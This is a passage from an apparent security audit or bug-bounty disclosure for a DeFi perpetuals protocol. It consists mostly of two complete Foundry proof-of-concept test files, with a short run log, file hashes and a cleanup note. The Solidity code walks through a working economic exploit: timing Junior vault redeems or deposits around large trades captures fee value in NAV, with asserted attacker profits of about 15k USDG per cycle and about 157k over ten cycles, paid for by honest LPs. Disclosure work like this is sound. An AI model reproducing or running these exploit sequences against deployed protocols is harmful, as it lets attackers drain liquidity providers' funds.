Ran 2 test suites in 69.11ms (129.24ms CPU time): 7 tests passed, 0 failed, 0 skipped (7 total tests)
```

All USDG log values are six-decimal atoms. For example, `15610991561` is `15,610.991561 USDG`.

**Generated evidence files**

The sealed authored files and fresh run log are:

```text
PLR0001VpiNavExitE2E.t.sol
PLR0069VpiNavMirrorE2E.t.sol
forge-results.txt
```

Their SHA-256 hashes are:

```text
ecc231544c5715e9760378d1e301e41838ae17baeaedeb3fc633ddc770383c29  PLR0001VpiNavExitE2E.t.sol
cea545a41bd6a7b5e00f9d87f391f4125ecfbb86d2f7029ea43a8a570dec4cff  PLR0069VpiNavMirrorE2E.t.sol
1f1790f4a8580cd5af4299de00216dbe2a10342a855f24747d495c19b72b8dd0  forge-results.txt
```

**Cleanup**

The PoC starts no Docker services or fork node and creates no persistent chain state. Remove the optional local log after review with:

```bash
rm /tmp/plether-vpi-nav-e2e.log
```

**Complete authored PoC file: `PLR0001VpiNavExitE2E.t.sol`**

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {ICfdEngineRiskParamsView} from "@plether/perps/interfaces/ICfdEngineRiskParamsView.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";

/// @notice Exit direction of the VPI-in-NAV ownership-transfer family (PLR-0001).
/// @dev Uses the repository's production-contract fixture,
///      ordinary ERC-7540 request/funding/claim flows, the bounded V3 Router adapter and real CH/Engine/Pool writers.
contract PLR0001VpiNavExitE2E is BasePerpTest {
    address constant ATTACKER = address(0xA001);
    address constant HONEST_JUNIOR = address(0xB001);
    address constant SENIOR_LP = address(0xD001);

    uint256 constant JUNIOR_CAPITAL = 30_000_000e6;
    uint256 constant SENIOR_CAPITAL = 20_000_000e6;
    uint256 constant POOL_DEPTH = 50_000_000e6;
    uint256 constant ATTACKER_TRADER_BASIS = 1_000_000e6;
    uint256 constant TRADE_NOTIONAL = 19_900_000e6;
    uint256 constant TRADE_SIZE = 19_900_000e18;
    uint256 constant OPEN_MARGIN = 500_000e6;
    uint256 constant EXPECTED_VPI = 39_601e6;
    uint256 constant EXPECTED_FEE = 7_960e6;
    uint256 constant ORIGINAL_OTHER_JUNIOR = 6_000_000e6;

    struct ExitResult {
        int256 attackerNet;
        uint256 otherJuniorLoss;
        uint256 treasuryGain;
        uint256 openingVpi;
        uint256 closePayout;
        uint256 lpPayout;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) { return 1e6; }
    function _initialSeniorSeedDeposit() internal pure override returns (uint256) { return 1e6; }
    function _initialJuniorDeposit() internal pure override returns (uint256) { return 0; }
    function _initialSeniorDeposit() internal pure override returns (uint256) { return 0; }

    function setUp() public override {
        super.setUp();

        // BasePerpTest widens these values for generic unit tests. Restore checked-in release configuration through
        // the actual delayed admin paths, then assert every parameter used by this proof.
        _setSeniorCapacity(40_000_000e6, 8000);
        IOrderRouterAdminHost.RouterConfig memory routerConfig = _routerConfig();
        routerConfig.minOpenNotionalAssets = 1_000e6;
        _setRouterConfig(routerConfig);
        _warpNextOpenMonday();
        CfdTypes.RiskParams memory risk = ICfdEngineRiskParamsView(address(engine)).riskParams();
        assertEq(settlementToken.decimals(), 6, "release USDG decimals");
        assertEq(risk.vpiFactor, 0.01e18, "release VPI factor");
        assertEq(risk.maxSkewRatio, 0.4e18, "release skew cap");
        assertEq(engine.executionFeeBps(), 4, "release execution fee");
        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6, "release Senior cap");
        assertEq(pool.maxSeniorShareBps(), 8000, "release Senior share cap");
        assertEq(router.minOpenNotionalAssets(), 1_000e6, "release minimum open notional");
        assertEq(pool.LP_EPOCH_DURATION(), 1 hours, "release LP epoch");
        assertEq(juniorVault.LP_REQUEST_CUTOFF_DURATION(), 5 minutes, "release request cutoff");
        assertEq(juniorVault.DEPOSIT_COOLDOWN(), 1 hours, "release deposit cooldown");
    }

    function _prime(uint256 attackerJuniorAssets) internal returns (uint256 attackerShares) {
        // The $1 Junior seed belongs to the fixture, so deposits below sum to exactly $30m Junior capital.
        uint256 honestJuniorAssets = JUNIOR_CAPITAL - 1e6 - attackerJuniorAssets;
        _fundJunior(ATTACKER, attackerJuniorAssets);
        if (honestJuniorAssets != 0) _fundJunior(HONEST_JUNIOR, honestJuniorAssets);
        _fundSenior(SENIOR_LP, SENIOR_CAPITAL - 1e6);
        _fundTrader(ATTACKER, ATTACKER_TRADER_BASIS);

        attackerShares = juniorVault.balanceOf(ATTACKER);
        assertGt(attackerShares, 0);
        assertApproxEqAbs(pool.totalAssets(), POOL_DEPTH, 2, "50m release pool depth");
    }

    function _warpNextOpenMonday() internal {
        uint256 day = block.timestamp / 1 days;
        uint256 monday = day + (8 - ((day + 4) % 7)) % 7;
        uint256 mondayNoon = monday * 1 days + 12 hours;
        if (mondayNoon <= block.timestamp) mondayNoon += 7 days;
        vm.warp(mondayNoon);
    }

    function _queueExitBeforeCutoff(uint256 shares) internal returns (uint256 requestId, uint256 boundary) {
        vm.prank(ATTACKER);
        requestId = juniorVault.requestRedeem(shares, ATTACKER, ATTACKER);
        boundary = pool.lpEpochStart(requestId);
        assertLe(block.timestamp, boundary - 5 minutes, "redeem queued before b-300");
        vm.warp(boundary - 5 minutes - 2);
    }

    function _openLong() internal returns (uint256 openingVpi, uint256 treasuryGain) {
        uint256 poolBefore = settlementToken.balanceOf(address(pool));
        uint256 treasuryBefore = clearinghouse.balanceAssets(engine.protocolTreasury());
        vm.startPrank(ATTACKER);
        router.commitOrder(CfdTypes.Side.LONG, TRADE_SIZE, OPEN_MARGIN, 1e8, false);
        router.executeOrder(router.nextExecuteId(), _mockPythUpdateData(1e8));
        vm.stopPrank();

        openingVpi = settlementToken.balanceOf(address(pool)) - poolBefore;
        treasuryGain = clearinghouse.balanceAssets(engine.protocolTreasury()) - treasuryBefore;
        assertApproxEqAbs(openingVpi, EXPECTED_VPI, 1_000e6, "X tracks .005*S^2/D across repeated-cycle NAV drift");
        assertEq(treasuryGain, EXPECTED_FEE, "4 bps open fee credited to Treasury");
    }

    function _closeLong() internal returns (uint256 poolPayout) {
        uint256 poolBefore = settlementToken.balanceOf(address(pool));
        vm.startPrank(ATTACKER);
        router.commitOrder(CfdTypes.Side.LONG, TRADE_SIZE, 0, 0, true);
        router.executeOrder(router.nextExecuteId(), _mockPythUpdateData(1e8));
        vm.stopPrank();
        poolPayout = poolBefore - settlementToken.balanceOf(address(pool));
        // A few USDG of carry accrues across the mandatory epoch boundary; the lifetime clamp still returns X
        // less the close execution fee, net of that production carry path.
        assertApproxEqAbs(poolPayout, EXPECTED_VPI - EXPECTED_FEE, 200e6, "lifetime clamp returns X less fee/carry");
    }

    function _settleAndClaimExit(uint256 requestId, uint256 shares, uint256 boundary)
        internal returns (uint256 assets)
    {
        if (block.timestamp < boundary) vm.warp(boundary);
        router.settleLpEpoch(_mockPythUpdateData(1e8));
        vm.prank(ATTACKER);
        assets = juniorVault.claimRedeem(requestId, shares, ATTACKER, ATTACKER);
    }

    function _withdrawTraderCash() internal {
        uint256 amount = clearinghouse.balanceAssets(ATTACKER);
        vm.prank(ATTACKER);
        clearinghouse.withdraw(ATTACKER, amount);
    }

    function _runAttack(uint256 attackerJuniorAssets) internal returns (ExitResult memory result) {
        uint256 attackerShares = _prime(attackerJuniorAssets);
        (uint256 requestId, uint256 boundary) = _queueExitBeforeCutoff(attackerShares);
        (result.openingVpi, result.treasuryGain) = _openLong();
        result.lpPayout = _settleAndClaimExit(requestId, attackerShares, boundary);
        result.closePayout = _closeLong();
        _withdrawTraderCash();

        uint256 attackerFinal = settlementToken.balanceOf(ATTACKER);
        result.attackerNet = int256(attackerFinal) - int256(attackerJuniorAssets + ATTACKER_TRADER_BASIS);
        uint256 otherJuniorNav = juniorVault.convertToAssets(juniorVault.totalSupply());
        uint256 otherJuniorBasis = JUNIOR_CAPITAL - attackerJuniorAssets;
        result.otherJuniorLoss = otherJuniorBasis - otherJuniorNav;
    }

    function test_exitLeg_80pct_attack_and_honestLoss() public {
        ExitResult memory result = _runAttack(24_000_000e6);
        assertApproxEqAbs(result.attackerNet, int256(15_610_991_561), 2_000_000, "attacker realized net ~15.61k USDG");
        assertApproxEqAbs(result.otherJuniorLoss, 23_753_743_050, 2_000_000, "other Junior realized loss ~23.75k");
        assertEq(result.treasuryGain, EXPECTED_FEE);

        emit log_named_int("exit attacker net atoms", result.attackerNet);
        emit log_named_uint("exit other Junior loss atoms", result.otherJuniorLoss);
        emit log_named_uint("exit Treasury gain atoms", result.treasuryGain);
        emit log_named_uint("exit opening VPI atoms", result.openingVpi);
        emit log_named_uint("exit close Pool payout atoms", result.closePayout);
        emit log_named_uint("exit LP funded payout atoms", result.lpPayout);
    }

    function test_exitLeg_validControl_closeBeforeExit_losesTwoFees() public {
        uint256 attackerShares = _prime(24_000_000e6);
        (uint256 requestId, uint256 boundary) = _queueExitBeforeCutoff(attackerShares);
        _openLong();
        _closeLong();
        _settleAndClaimExit(requestId, attackerShares, boundary);
        _withdrawTraderCash();

        uint256 attackerFinal = settlementToken.balanceOf(ATTACKER);
        uint256 loss = 24_000_000e6 + ATTACKER_TRADER_BASIS - attackerFinal;
        assertApproxEqAbs(loss, 9_704_429_722, 2_000_000, "close-before-exit control realizes a loss");
        emit log_named_uint("exit control attacker loss atoms", loss);
    }

    function test_exitLeg_requestedSettleBeforeOpenControl_isNotSameExecutableTrade() public {
        uint256 attackerShares = _prime(24_000_000e6);
        (uint256 requestId, uint256 boundary) = _queueExitBeforeCutoff(attackerShares);
        _settleAndClaimExit(requestId, attackerShares, boundary);
        assertApproxEqAbs(pool.totalAssets(), 26_000_000e6, 200e6, "80% Junior exit leaves ~26m depth");

        // The same 19.9m LONG would be 76.5% of the remaining depth, so the release 40% skew cap rejects it.
        vm.startPrank(ATTACKER);
        vm.expectRevert();
        router.commitOrder(CfdTypes.Side.LONG, TRADE_SIZE, OPEN_MARGIN, 1e8, false);
        vm.stopPrank();
    }

    function test_exitLeg_ownershipBoundaries_40_80_100pct() public {
        uint256 clean = vm.snapshotState();
        ExitResult memory f40 = _runAttack(12_000_000e6);
        assertApproxEqAbs(f40.attackerNet, int256(0), 200_000_000, "40% is approximately break-even");

        assertTrue(vm.revertToState(clean));
        ExitResult memory f80 = _runAttack(24_000_000e6);
        assertGt(f80.attackerNet, int256(15_000e6), "80% is profit");

        assertTrue(vm.revertToState(clean));
        uint256 attackerShares = _prime(29_999_999e6);
        (uint256 requestId, uint256 boundary) = _queueExitBeforeCutoff(attackerShares);
        _openLong();
        if (block.timestamp < boundary) vm.warp(boundary);
        router.settleLpEpoch(_mockPythUpdateData(1e8));
        uint256 fundedShares = juniorVault.claimableRedeemRequest(requestId, ATTACKER);
        assertLt(fundedShares, attackerShares, "100% request is capped by the 80% Senior covenant");

        emit log_named_int("exit f40 net atoms", f40.attackerNet);
        emit log_named_int("exit f80 net atoms", f80.attackerNet);
        emit log_named_uint("exit f100 funded shares after covenant", fundedShares);
    }

    function _requestExistingJuniorDeposit(uint256 assets) internal returns (uint256 requestId) {
        vm.startPrank(ATTACKER);
        settlementToken.approve(address(juniorVault), assets);
        requestId = juniorVault.requestDeposit(assets, ATTACKER, ATTACKER);
        vm.stopPrank();
    }

    function _settleAndClaimDeposit(uint256 requestId, uint256 assets) internal returns (uint256 shares) {
        uint256 activation = juniorVault.depositEpochStart(requestId);
        if (block.timestamp < activation) vm.warp(activation);
        router.settleLpEpoch(_mockPythUpdateData(1e8));
        vm.prank(ATTACKER);
        shares = juniorVault.claimDeposit(requestId, assets, ATTACKER, ATTACKER);
        assertGt(shares, 0);
        vm.warp(block.timestamp + juniorVault.DEPOSIT_COOLDOWN());
    }

    function test_exitLeg_repeatTenCycles_netProfitAndVictimLoss() public {
        uint256 attackerShares = _prime(24_000_000e6);
        uint256 treasuryBefore = clearinghouse.balanceAssets(engine.protocolTreasury());
        uint256 start = vm.getBlockTimestamp();

        for (uint256 i; i < 10; ++i) {
            uint256 cycleStarted = vm.getBlockTimestamp();
            (uint256 requestId, uint256 boundary) = _queueExitBeforeCutoff(attackerShares);
            _openLong();
            _settleAndClaimExit(requestId, attackerShares, boundary);
            _closeLong();

            if (i != 9) {
                uint256 depositId = _requestExistingJuniorDeposit(24_000_000e6);
                attackerShares = _settleAndClaimDeposit(depositId, 24_000_000e6);
            }
            if (vm.getBlockTimestamp() < cycleStarted + 3 hours) vm.warp(cycleStarted + 3 hours);
            assertGe(vm.getBlockTimestamp() - cycleStarted, 3 hours, "each repetition spans at least three LP epochs");
        }

        _withdrawTraderCash();
        uint256 attackerProfit = settlementToken.balanceOf(ATTACKER) - 24_000_000e6 - ATTACKER_TRADER_BASIS;
        uint256 otherJuniorNav = juniorVault.convertToAssets(juniorVault.totalSupply());
        uint256 otherJuniorLoss = ORIGINAL_OTHER_JUNIOR - otherJuniorNav;
        uint256 treasuryGain = clearinghouse.balanceAssets(engine.protocolTreasury()) - treasuryBefore;

        assertGe(vm.getBlockTimestamp(), start + 30 hours, "ten cycles span at least three epochs each");
        assertApproxEqAbs(attackerProfit, 157_000e6, 5_000e6, "ten-cycle attacker profit ~157k");
        assertApproxEqAbs(otherJuniorLoss, 237_000e6, 5_000e6, "ten-cycle other-Junior loss ~237k");
        assertEq(treasuryGain, 10 * EXPECTED_FEE, "ten opening fees credited to Treasury");

        emit log_named_uint("exit ten-cycle elapsed seconds", vm.getBlockTimestamp() - start);
        emit log_named_uint("exit ten-cycle attacker profit atoms", attackerProfit);
        emit log_named_uint("exit ten-cycle other Junior loss atoms", otherJuniorLoss);
        emit log_named_uint("exit ten-cycle Treasury gain atoms", treasuryGain);
    }
}
```

**Complete authored PoC file: `PLR0069VpiNavMirrorE2E.t.sol`**

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {ICfdEngineAdminHost} from "@plether/perps/interfaces/ICfdEngineAdminHost.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";

/// @notice Production-topology proof for PLR-0069, the negative-VPI entry mirror of PLR-0001.
/// @dev All economic mutations use the deployed Pool/Vault/Engine/CH/Router fixture contracts. Cheatcodes only
///      provide user starting balances and advance the documented asynchronous epoch/cooldown clock.
contract PLR0069VpiNavMirrorE2E is BasePerpTest {
    address constant OLD_JUNIOR = address(0xB001);
    address constant SENIOR_LP = address(0xD001);
    address constant ORGANIC_LONG = address(0xE001);
    address constant ATTACKER = address(0xA001);

    uint256 constant JUNIOR_ASSETS = 29_999_999e6;
    uint256 constant SENIOR_ASSETS = 19_999_999e6;
    uint256 constant ORGANIC_SIZE = 20_000_000e18;
    uint256 constant ATTACK_SIZE = 12_000_000e18;
    uint256 constant ORGANIC_MARGIN = 500_000e6;
    uint256 constant ATTACK_MARGIN = 500_000e6;
    uint256 constant ORGANIC_CASH = 1_000_000e6;
    uint256 constant ATTACK_TRADER_CASH = 1_000_000e6;
    uint256 constant ENTRY_ASSETS = 60_000_000e6;
    uint256 constant PRICE = 1e8;

    struct Outcome {
        int256 attackerNet;
        uint256 oldJuniorLoss;
        uint256 treasuryGain;
        uint256 grossOpenRebate;
        uint256 poolOpenCashDrop;
        uint256 entryShares;
        uint256 exitAssets;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) { return 1e6; }
    function _initialSeniorSeedDeposit() internal pure override returns (uint256) { return 1e6; }
    function _initialJuniorDeposit() internal pure override returns (uint256) { return 0; }
    function _initialSeniorDeposit() internal pure override returns (uint256) { return 0; }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000);
        IOrderRouterAdminHost.RouterConfig memory routerConfig = _routerConfig();
        routerConfig.minOpenNotionalAssets = 1_000e6;
        _setRouterConfig(routerConfig);

        // The delayed release-config activation lands on Sunday in the fixture. Continue at the next live-market
        // Monday so the production deposit/calendar guards remain enabled rather than bypassing them.
        vm.warp(1_710_151_200); // Monday 2024-03-11 10:00:00 UTC.

        (uint256 vpiFactor, uint256 maxSkewRatio,,,,,,,,) = engine.riskParams();
        assertEq(settlementToken.decimals(), 6, "USDG decimals");
        assertEq(vpiFactor, 0.01e18, "release VPI factor");
        assertEq(maxSkewRatio, 0.4e18, "release skew cap");
        assertEq(engine.executionFeeBps(), 4, "release execution fee");
        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6, "release Senior cap");
        assertEq(pool.maxSeniorShareBps(), 8000, "release Senior ratio cap");
        assertEq(router.minOpenNotionalAssets(), 1_000e6, "release minimum open notional");
        assertEq(juniorVault.DEPOSIT_COOLDOWN(), 1 hours, "release LP cooldown");
    }

    function _prime() internal returns (uint256 oldJuniorShares, uint256 oldJuniorBasis) {
        _fundJunior(OLD_JUNIOR, JUNIOR_ASSETS);
        _fundSenior(SENIOR_LP, SENIOR_ASSETS);
        _fundTrader(ORGANIC_LONG, ORGANIC_CASH);
        _fundTrader(ATTACKER, ATTACK_TRADER_CASH);

        settlementToken.mint(ATTACKER, ENTRY_ASSETS);
        vm.prank(ATTACKER);
        settlementToken.approve(address(juniorVault), type(uint256).max);

        assertApproxEqAbs(pool.totalAssets(), 50_000_000e6, 2, "initial D=50M");
        uint256 poolBefore = settlementToken.balanceOf(address(pool));
        _openViaRouter(ORGANIC_LONG, CfdTypes.Side.LONG, ORGANIC_SIZE, ORGANIC_MARGIN);
        uint256 organicVpiCash = settlementToken.balanceOf(address(pool)) - poolBefore;
        assertApproxEqAbs(organicVpiCash, 40_000e6, 2, "organic 20M long contributes about 40k VPI");

        // Reconcile the organic open before the attack. Redeem precisely the revenue-sized value so the attack starts
        // from D≈50M/J≈30M while the real 20M net-long book stays open.
        uint256 supply = juniorVault.totalSupply();
        uint256 principalBefore = juniorVault.totalAssets();
        uint256 normalizerShares = (organicVpiCash * supply) / (principalBefore + organicVpiCash);
        vm.prank(OLD_JUNIOR);
        uint256 normalizeId = juniorVault.requestRedeem(normalizerShares, OLD_JUNIOR, OLD_JUNIOR);
        _settleEpoch(normalizeId);
        vm.prank(OLD_JUNIOR);
        juniorVault.claimRedeem(normalizeId, normalizerShares, OLD_JUNIOR, OLD_JUNIOR);

        // A real epoch elapses while the normalizing redeem is funded, adding roughly $53 of Senior coupon.
        assertApproxEqAbs(pool.totalAssets(), 50_000_000e6, 100e6, "normalized pre-attack D=50M");
        oldJuniorShares = juniorVault.balanceOf(OLD_JUNIOR);
        oldJuniorBasis = juniorVault.convertToAssets(oldJuniorShares);
        assertApproxEqAbs(oldJuniorBasis, 30_000_000e6, 200e6, "remaining old Junior basis near 30M");
        assertEq(_sideOpenInterest(CfdTypes.Side.LONG), ORGANIC_SIZE, "organic 20M long remains open");
        assertEq(_sideOpenInterest(CfdTypes.Side.SHORT), 0, "no pre-existing short");
    }

    function _openViaRouter(address account, CfdTypes.Side side, uint256 size, uint256 margin) internal {
        vm.prank(account);
        uint64 id = router.commitOrder(side, size, margin, PRICE, false);
        router.executeOrder(id, _mockPythUpdateData(PRICE));
    }

    function _closeViaRouter(address account, CfdTypes.Side side, uint256 size) internal {
        vm.prank(account);
        uint64 id = router.commitOrder(side, size, 0, 0, true);
        router.executeOrder(id, _mockPythUpdateData(PRICE));
    }

    function _settleEpoch(uint256 id) internal {
        uint256 at = pool.lpEpochStart(id);
        if (block.timestamp < at) vm.warp(at);
        router.settleLpEpoch(_mockPythUpdateData(PRICE));
    }

    function _requestEntry() internal returns (uint256 id) {
        vm.prank(ATTACKER);
        id = juniorVault.requestDeposit(ENTRY_ASSETS, ATTACKER, ATTACKER);
    }

    function _activateEntry(uint256 id) internal returns (uint256 shares) {
        _settleEpoch(id);
        uint256 claimable = juniorVault.claimableDepositRequest(id, ATTACKER);
        assertEq(claimable, ENTRY_ASSETS, "entire 60M entry funded");
        vm.prank(ATTACKER);
        shares = juniorVault.claimDeposit(id, claimable, ATTACKER, ATTACKER);
        assertGt(shares, 0, "entry minted Junior shares");
    }

    function _exitEntryShares(uint256 shares, uint256 activationId) internal returns (uint256 assets) {
        // Force a cycle spanning at least four hourly epochs from activation to funded exit.
        uint256 requestAt = pool.lpEpochStart(activationId) + 3 hours + 1;
        if (block.timestamp < requestAt) vm.warp(requestAt);
        vm.prank(ATTACKER);
        uint256 id = juniorVault.requestRedeem(shares, ATTACKER, ATTACKER);
        assertGe(id, activationId + 4, "cycle spans at least four epochs");
        _settleEpoch(id);
        vm.prank(ATTACKER);
        assets = juniorVault.claimRedeem(id, shares, ATTACKER, ATTACKER);
    }

    function _runCycle(bool vulnerableOrder, uint256 oldShares, uint256 oldBasis) internal returns (Outcome memory o) {
        uint256 walletBefore = settlementToken.balanceOf(ATTACKER);
        uint256 chBefore = clearinghouse.balanceAssets(ATTACKER);
        if (chBefore < ATTACK_TRADER_CASH) {
            uint256 topUp = ATTACK_TRADER_CASH - chBefore;
            vm.startPrank(ATTACKER);
            settlementToken.approve(address(clearinghouse), topUp);
            clearinghouse.deposit(ATTACKER, topUp);
            vm.stopPrank();
        }
        uint256 treasuryBefore = clearinghouse.balanceAssets(PROTOCOL_TREASURY_ACCOUNT);
        uint256 poolBeforeOpen = settlementToken.balanceOf(address(pool));
        uint256 entryId = _requestEntry();

        if (vulnerableOrder) {
            _openViaRouter(ATTACKER, CfdTypes.Side.SHORT, ATTACK_SIZE, ATTACK_MARGIN);
            uint256 reserve = clearinghouse.vpiRebateReserveAssets(ATTACKER);
            assertApproxEqAbs(reserve, 33_600e6, 250e6, "gross negative VPI reserve near 33.6k");
            o.grossOpenRebate = reserve;
            o.poolOpenCashDrop = poolBeforeOpen - settlementToken.balanceOf(address(pool));
            // The real route debits the 4.8k execution fee from the trader's CH balance; the pool pays the full R.
            assertApproxEqAbs(o.poolOpenCashDrop, reserve, 3, "pool cash/NAV dips by the full VPI rebate");
            o.entryShares = _activateEntry(entryId);
        } else {
            o.entryShares = _activateEntry(entryId);
            poolBeforeOpen = settlementToken.balanceOf(address(pool));
            _openViaRouter(ATTACKER, CfdTypes.Side.SHORT, ATTACK_SIZE, ATTACK_MARGIN);
            o.grossOpenRebate = clearinghouse.vpiRebateReserveAssets(ATTACKER);
            o.poolOpenCashDrop = poolBeforeOpen - settlementToken.balanceOf(address(pool));
        }

        _closeViaRouter(ATTACKER, CfdTypes.Side.SHORT, ATTACK_SIZE);
        assertEq(clearinghouse.vpiRebateReserveAssets(ATTACKER), 0, "close repays lifetime VPI reserve");
        o.exitAssets = _exitEntryShares(o.entryShares, entryId);

        uint256 chAfter = clearinghouse.balanceAssets(ATTACKER);
        if (chAfter != 0) {
            vm.prank(ATTACKER);
            clearinghouse.withdraw(ATTACKER, chAfter);
        }
        assertEq(clearinghouse.balanceAssets(ATTACKER), 0, "trader proceeds are realized to wallet USDG");
        uint256 walletAfter = settlementToken.balanceOf(ATTACKER);
        o.attackerNet = int256(walletAfter) - int256(walletBefore + chBefore);
        uint256 oldNav = juniorVault.convertToAssets(oldShares);
        o.oldJuniorLoss = oldBasis > oldNav ? oldBasis - oldNav : 0;
        o.treasuryGain = clearinghouse.balanceAssets(PROTOCOL_TREASURY_ACCOUNT) - treasuryBefore;
    }

    function test_PLR0069_AttackVersusSettleBeforeOpenControl() public {
        (uint256 oldShares, uint256 oldBasis) = _prime();
        uint256 snap = vm.snapshotState();

        Outcome memory attack = _runCycle(true, oldShares, oldBasis);
        assertGt(attack.attackerNet, 8_000e6, "mirror attack is net profitable");
        assertLt(attack.attackerNet, 15_000e6, "mirror profit remains in the predicted low-five-figure range");
        assertGt(attack.oldJuniorLoss, 17_000e6, "old Junior LPs lose principal value");
        assertLt(attack.oldJuniorLoss, 25_000e6, "old Junior loss remains in the predicted low-five-figure range");
        assertApproxEqAbs(attack.treasuryGain, 9_600e6, 2, "two 4-bps fees reach Treasury");

        assertTrue(vm.revertToState(snap), "restore identical pre-cycle state");
        Outcome memory control = _runCycle(false, oldShares, oldBasis);
        assertLt(control.attackerNet, 0, "settle-before-open control loses fees");
        assertGt(attack.attackerNet - control.attackerNet, 17_000e6, "ordering creates the LP transfer");

        emit log_named_int("mirror attack attacker net", attack.attackerNet);
        emit log_named_uint("mirror attack old-Junior loss", attack.oldJuniorLoss);
        emit log_named_uint("mirror Treasury fees", attack.treasuryGain);
        emit log_named_uint("mirror gross reserve", attack.grossOpenRebate);
        emit log_named_uint("mirror pool dip", attack.poolOpenCashDrop);
        emit log_named_int("mirror control attacker net", control.attackerNet);
    }

    function test_PLR0069_TenRepeatableCycles() public {
        (uint256 oldShares, uint256 oldBasis) = _prime();
        uint256 attackerStart = settlementToken.balanceOf(ATTACKER) + clearinghouse.balanceAssets(ATTACKER);
        uint256 treasuryStart = clearinghouse.balanceAssets(PROTOCOL_TREASURY_ACCOUNT);

        for (uint256 i; i < 10; ++i) {
            Outcome memory cycle = _runCycle(true, oldShares, oldBasis);
            assertGt(cycle.attackerNet, 8_000e6, "each cycle remains net profitable");
            assertEq(_sideOpenInterest(CfdTypes.Side.LONG), ORGANIC_SIZE, "organic skew persists");
            assertEq(_sideOpenInterest(CfdTypes.Side.SHORT), 0, "attacker closes each cycle");
        }

        uint256 attackerEnd = settlementToken.balanceOf(ATTACKER) + clearinghouse.balanceAssets(ATTACKER);
        uint256 totalProfit = attackerEnd - attackerStart;
        uint256 oldLoss = oldBasis - juniorVault.convertToAssets(oldShares);
        uint256 treasuryGain = clearinghouse.balanceAssets(PROTOCOL_TREASURY_ACCOUNT) - treasuryStart;
        assertGt(totalProfit, 80_000e6, "ten cycles yield material repeatable profit");
        assertLt(totalProfit, 150_000e6, "ten-cycle profit remains near the one-cycle production measurement times ten");
        assertGt(oldLoss, 170_000e6, "old Junior LPs absorb repeatable loss");
        assertLt(oldLoss, 270_000e6, "old Junior loss remains near the one-cycle production measurement times ten");
        assertApproxEqAbs(treasuryGain, 96_000e6, 20, "ten cycles pay 96k execution fees");

        emit log_named_uint("mirror ten-cycle attacker profit", totalProfit);
        emit log_named_uint("mirror ten-cycle old-Junior loss", oldLoss);
        emit log_named_uint("mirror ten-cycle Treasury fees", treasuryGain);
    }
}
```
